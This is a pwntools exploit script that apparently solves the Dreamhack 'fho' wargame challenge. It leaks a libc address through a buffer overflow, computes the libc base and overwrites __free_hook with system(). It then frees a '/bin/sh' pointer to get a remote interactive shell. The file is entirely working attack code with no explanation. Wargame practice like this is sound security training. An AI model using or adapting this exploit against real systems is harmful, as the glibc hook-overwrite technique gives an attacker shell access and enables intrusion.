from pwn import *


#p = process('./fho')
p = remote('host3.dreamhack.games', 12141)
e = ELF('./fho')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')

libc_start_main_offset = libc.symbols['__libc_start_main'] + 231
system_offset = libc.symbols['system']
free_hook_offset = libc.symbols['__free_hook']
binsh_offset = next(libc.search(b"/bin/sh"))


payload = b''
payload += b'A'*0x48

p.sendafter(b'Buf: ', payload)

p.recvuntil(payload)

libc_start_main_addr = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_addr - libc_start_main_offset
system_addr = libc_base + system_offset
free_hook_addr = libc_base + free_hook_offset
binsh_addr = libc_base + binsh_offset

print(hex(libc_start_main_addr))

payload = str(free_hook_addr)
print(payload.encode())
p.sendlineafter(b"To write: ", payload.encode())

payload = str(system_addr)
p.sendlineafter(b"With: ", payload.encode())

payload = str(binsh_addr)
p.sendlineafter(b"To free: ", payload.encode())

p.interactive()
